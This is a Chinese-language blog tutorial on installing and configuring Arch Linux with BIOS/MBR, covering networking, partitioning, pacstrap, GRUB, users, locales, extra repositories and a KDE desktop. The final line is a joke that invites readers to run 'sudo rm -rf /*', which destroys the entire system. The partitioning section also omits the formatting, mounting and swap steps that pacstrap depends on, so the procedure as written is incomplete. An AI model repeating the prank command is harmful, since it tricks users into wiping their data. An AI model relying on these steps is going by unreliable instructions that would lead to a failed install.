---
title: Arch Linux 安装教程（以BIOS/MBR为例）
date: 2025-04-11 18:03:40
categories: 
- 技术
tags:
- Arch Linux
- 教程
---

# 1 Arch Linux的安装

## 1.1 前置工作

>**$ ls /sys/firmware/efi/efivars**  

#验证引导模式（如果目录不存在，即为Legacy BIOS引导模式；反之，请使用以UEFI为例的教程

>**$ iwctl**  

运行iwctl(如果是有线网络，可直接跳到"ping archlinux.org"这一步) 

>**[iwctl]# device list**   

#列出WiFi设备（一般为wlan0；这里以wlan0为例）   
>**[iwctl]# station wlan0 scan**  

扫描网络   
>**[iwctl]# station wlan0 get-networks**   

列出可用网络   
>**[iwctl]# station wlan0 connect XXX**   

连接到XXX（XXX改成你的WiFi名称）  
>**[iwctl]# exit**   

退出iwctl

>**$ ping archlinux.org**  

检查网络连接（如果不停的有输出内容，即为联网成功；按Ctrl+C退出）

>**$ reflector --country China --save /etc/pacman.d/mirrorlist**  

换源（注意大小写）

>**$ systemctl stop reflector**  

关闭reflector服务

>**$ vim /etc/pacman.d/mirrorlist**   

编辑/etc/pacman.d/mirrorlist文件，保留需要的源（一般推荐使用中科大源（USTC）或清华（TUNA）源）   

**如果不会使用vim，记住这三个就行了:  
按键盘上面的“i”或者“insert”键进入【编辑模式】  
按‘ESC’退出编辑模式  
输入：wq（冒号别漏了）保存并退出**


>**$ timedatectl set-ntp true**   

同步时间   

>**$ timedatectl status**   

检查服务状态

>**$ pacman -Syy**  

同步数据

----------

## 1.2 分区挂载

**警告：此过程必须慎重（尤其是对于双硬盘/多硬盘等存有大量或高价值数据者），严重者可能会丢失所有数据！**

**此处使用SATA硬盘为例**

第一种方法：使用fdisk

>**$ fdisk /dev/sda**   

#使用fdisk对sda进行相关操作   
#步骤如下：   
>**Command (m for help): o**    

#输入o新建MBR分区表   
>**Command (m for help): n**   

#输入n创建新分区   
>**Select (default p): p**   

#这里按Enter键创建主分区（如果想创建逻辑扩展分区请输入e）   
>**Partition number (1-4, default 1):**   

#这里按Enter键   
>**First sector (2048-X, default 2048):**    

#这里按Enter键   
>**Last sector, +/-sectors or +/-size{K,M,G,T,P} (2048-X, default X): +10G**   

#输入+10G   
>**Command (m for help): t**    

#输入t更改分区类型   
>**Hex code or alias (type L to list all): 82**   

#输入82，创建swap分区   
>**Command (m for help): n**   

#输入n创建新分区，然后一直按Enter键，把剩下的空间全部分配给/分区    
>**Command (m for help): w**    

#输入w写入

-------

第二种方法：使用CFdisk（方便快捷，推荐新手使用）

**$ cfdisk /dev/sda**  
#进入cfdisk程序，并且对第一块硬盘进行编辑操作（得看你这里是第几块硬盘安装系统，如果是第二块就sdb,第三块就sdc......以此类推。）

进去以后你会看到你的分区信息。  

>**操作方法（按键盘上下键选择分区，左右键选择功能**）： 
>
>如果你想删除分区，请将光标移到delete并按下回车。  
>
>如果你想创建分区则移到列表下的free space按“new”。  
>
>如果是调节你想要的分区的大小，请按“resize”。
>
>更改分区类型按“type”。

**请准备两个空闲分区来安装Arch Linux。**

**准备一个任意大小（建议20GB以上）的分区**（假设为**sda1**，请根据实际情况判断），和一个 **等于你的 RAM（运行内存） 容量的3/4或全部 的分区**（假设为**sda2**，请根据实际情况判断）。

>将sda1的分区类型改为【83 Linux】  
sda2的分区类型改为【82 Linux Swap/Solaris】

更改完毕后按左右键选择【write】按回车，输入“yes”，再按一下。

**至此，arch的分区工作就完成了。**

---

## 1.3 安装Arch linux

>$ pacstrap /mnt linux linux-firmware linux-headers base base-devel vim bash-completion iwd dhcpcd networkmanager

#安装linux & linux-firmware & linux-headers & base & base-devel & vim & bash- completion & iwd & dhcpcd & networkmanager

>$ genfstab -U /mnt >> /mnt/etc/fstab

#生成/mnt/etc/fstab文件（注意大小写）

>$ cat /mnt/etc/fstab 

#查看/mnt/etc/fstab文件是否正确（如果不正确，请重新分区、挂载、pacstrap） 

>$ arch-chroot /mnt 

#进入目标系统 

>$ pacman -Syy 

#同步数据 

>$ pacman -S grub amd-ucode intel-ucode 

#安装grub & amd-ucode或intel-ucode（AMD的CPU安装amd-ucode，intel的CPU安装intel- ucode） 

>$ lsblk 

#查看硬盘名称 

>$ grub-install /dev/sda 

#将grub写入sda 

>$ grub-mkconfig -o /boot/grub/grub.cfg 

#生成/boot/grub/grub.cfg文件 

>$ systemctl enable iwd dhcpcd 

#开机自启iwd服务和dhcpcd服务 

>$ passwd root 

#设置root密码

---

## 1.4重启并进入下一步工作

>$ exit

#退出目标系统 

>$ umount /mnt 

#卸载/mnt目录（这里的意思是取消挂载，不是卸载软件的卸载！） 

>$ reboot 

#重启并登陆root（彻底关机那一刻请立即拔出安装U盘，如果觉得手慢就输入poweroff）

-----

**至此，Archlinux的基本安装就已经结束了。但是还没完，因为还要配置、本地化和安装桌面环境等操作。**

# 2 Arch Linux的配置

>$ iwctl   

#运行iwctl（使用方法请参考第一阶段的联网部分；台式机可跳过）  

>$ ping archlinux.org   

#检查网络连接（如果不停的有输出内容，即为联网成功；按Ctrl+C终止输出）   
>$ vim /etc/hostname   

#创建/etc/hostname文件，加入以下内容:   
arch    
#将主机名设置为arch    
>$ vim /etc/hosts    

#编辑/etc/hosts文件，在末尾加入以下内容：    
127.0.0.1 localhost    
::1 localhost   
127.0.1.1 arch.localdomain arch   
#配置hosts文件，映射IP地址和主机名    
>$ timedatectl set-timezone Asia/Shanghai && ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime && hwclock --systohc   

#设置时区为上海（注意大小写）   
>$ timedatectl set-ntp true   

#同步时间   
>$ timedatectl status   

#检查服务状态   
>$ vim /etc/skel/.bashrc   

#编辑/etc/skel/.bashrc文件，在开头加入以下内容：   
export EDITOR='vim'   
#设置vim为默认文本编辑器（注意大小写）   
>$ cp -a /etc/skel/. ~   

#复制/etc/skel目录下的文件到主目录   
>$ reboot   

#重启并登陆root   
>$ useradd --create-home arch   

#添加普通用户，用户名为arch   
>$ passwd arch  

#设置arch密码   
>$ usermod -aG adm,wheel,storage arch   

#将arch添加到相应的组中   
>$ id arch   

#查看用户组是否添加到相应的组中   
>$ visudo   

#设置用户权限，删除%wheel ALL=(ALL:ALL) ALL前面的#   
>$ reboot   

#重启并登陆root   
>$ vim /etc/locale.gen   

#编辑/etc/locale.gen文件,删除en_US.UTF-8 UTF-8和zh_CN.UTF-8 UTF-8前面的#   
>$ locale-gen   

#生成语言   
>$ vim /etc/locale.conf   

#创建/etc/locale.conf文件，加入以下内容：   
LANG=en_US.UTF-8   
#设置语言为en_US.UTF-8（注意大小写）   
>$ reboot   

#重启并登陆root $ vim /etc/pacman.conf   

#编辑/etc/pacman.conf文件，删除[multilib]区域的所有#（开启32位支持）并在末尾加入以下内容：    
[archlinuxcn]     
Server = https://mirrors.ustc.edu.cn/archlinuxcn/$arch    
#添加archlinuxcn源（一般推荐使用中科大源；除了可以添加archlinuxcn源外，还可以添加arch4edu源、blackarch源以及各种私有源，后面会提到；注意大小写）     

>$ pacman -Syy   

#同步数据   
>$ pacman -S archlinuxcn-keyring   

#安装archlinuxcn-keyring   
>$ rm -rf /etc/pacman.d/gnupg && pacman-key --init && pacman-key --populate archlinux && pacman-key --populate archlinuxcn   

#生成新的密钥环并重新签署密钥（安装archlinuxcn-keyring不报错时可跳过）   
>$ pacman -Syy     

#再次同步数据   
>$ pacman -S mesa lib32-mesa xf86-video-amdgpu vulkan-radeon lib32-vulkan-radeon libva-mesa-driver lib32-libva-mesa-driver mesa-vdpau lib32-mesa-vdpau xf86-video- ati   

#安装AMD核显相关驱动   
>$ pacman -S mesa lib32-mesa xf86-video-intel vulkan-intel lib32-vulkan-intel   

#安装intel核显相关驱动   
>$ pacman -S alsa-utils alsa-plugins alsa-oss alsa-firmware sof-firmware alsa-ucm- conf pulseaudio pulseaudio-alsa pulseaudio-bluetooth  

#安装声音相关驱动   
>$ systemctl enable bluetooth   

#开机自启bluetooth服务  
>$ reboot   

#重启并登陆root  

------

# 3 安装KDE桌面环境

>$ pacman -Syy   

#同步数据 
>$ pacman -S ttf-dejavu ttf-liberation noto-fonts noto-fonts-cjk noto-fonts-emoji noto-fonts-emoji-blob noto-fonts-extra adobe-source-han-sans-otc-fonts adobe- source-han-serif-otc-fonts wqy-bitmapfont wqy-microhei wqy-microhei-lite wqy- zenhei ttf-arphic-extra ttf-arphic-ukai ttf-arphic-uming 


#安装字体（请根据需要自行补充，这里只安装常用的包）   

>$ pacman -S plasma plasma-meta konsole dolphin kate ark gwenview vlc firefox firefox-i18n-zh-cn packagekit-qt5   

#安装KDE桌面及软件（这里只安装最必要的包，如果想完整使用KDE的各种功能请根据对应提示安装需要的包）  

>$ systemctl enable sddm   

#开机自启sddm服务   

>$ systemctl disable iwd   

#取消自启iwd服务   

>$ systemctl enable NetworkManager   

#开机自启NetworkManager服务（注意大小写）   

>$ reboot   

#重启

---

# 4 KDE的中文化

>System Settings（系统设置）>>Regional Settings（区域设置）>>Language（语言）>>Add
language（添加语言），找到简体中文后点Add（添加）。**添加简体中文后，将其移到最上面，并删除 其他多余语言，否则会出现汉化不全的情况。上述操作完成后，点击Apply（应用）。**  
System Settings（系统设置）>>Regional Settings（区域设置）>>Formats（格式）>>Region（区 域），选择简体中文（中国）。上述操作完成后，点击Apply（应用）。

-------------------

>$ reboot  

重启

----

# 5 AUR helper的安装

>$ sudo pacman -S yay   

#安装yay（它在某些时候可以替代pacman来安装软件）  

-----

# 6 添加其他软件源

>$ sudo pacman-key --recv-keys 7931B6D628C8D3BA && sudo pacman-key --finger 7931B6D628C8D3BA && sudo pacman-key --lsign-key 7931B6D628C8D3BA    

#导入arch4edu源的GPG key   

>$ sudo vim /etc/pacman.conf  

#编辑/etc/pacman.conf文件，在末尾加入以下内容：   
**[arch4edu] Server = https://mirrors.tuna.tsinghua.edu.cn/arch4edu/$arch**   
#添加arch4edu源

>$ sudo pacman -Syy  

#同步数据   
>$ sudo pacman -S arch4edu-keyring   

#安装arch4edu-keyring  

>$ sudo rm -rf /etc/pacman.d/gnupg && sudo pacman-key --init && sudo pacman-key --populate archlinux && sudo pacman-key --populate archlinuxcn && sudo pacman-key --populate arch4edu   

#生成新的密钥环并重新签署密钥   

>$ sudo pacman -Syy   

#再次同步数据

-----

# 7 更新系统  

>$ sudo pacman -Syu    

#更新系统   

>$ yay  

#更新系统及AUR软件

{% note warning %}
在更新时请先查看ArchLinux官网的新闻公告，看是否需要升级时人为干预，请勿无脑更新。
{% endnote %}

------

# 8 END
想再看一遍本教程吗？输入`sudo rm -rf /*`，你会回来的。
